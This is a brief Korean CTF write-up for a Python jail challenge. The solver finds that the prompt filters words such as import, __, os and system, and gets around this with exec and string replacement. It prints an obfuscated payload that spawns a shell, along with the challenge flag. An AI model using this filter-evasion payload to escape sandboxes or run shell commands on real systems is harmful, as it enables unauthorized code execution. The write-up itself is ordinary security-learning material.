# pyjail
- - - -
host와 포트번호를 주고 접속을 해보라고 한다.

* prob
![](pyjail/%E1%84%8F%E1%85%A2%E1%86%B8%E1%84%8E%E1%85%A5.PNG)
접속을 해보니 python prompt같이 동작하고 있다. 아무래도 시스템함수를 통해 flag를 읽으면 되는 문제로 보인다.
그래서 import os를 해보았는데 필터링을 하고 있었다. 
필터링 규칙은 `import, __, flag, system, os` 등이 있었다.
improt가 필터링 당해서 다른 방법으로 모듈을 넣을 방법을 찾아 보았는데 exec()함수를 사용해서 가능하다고 한다. 인자로는 스트링형식으로 들어가기에 필터링되는 것들은 replace를 사용해서 우회했다.


## payload
- - - -
```
exec('_1_im1port_1_("o1s")\x2esy1stem("sh")'.replace("1",""))
```


## flag
- - - -
flag{verry_ez_python_jail_chall}


#CTF/IGRUS/misc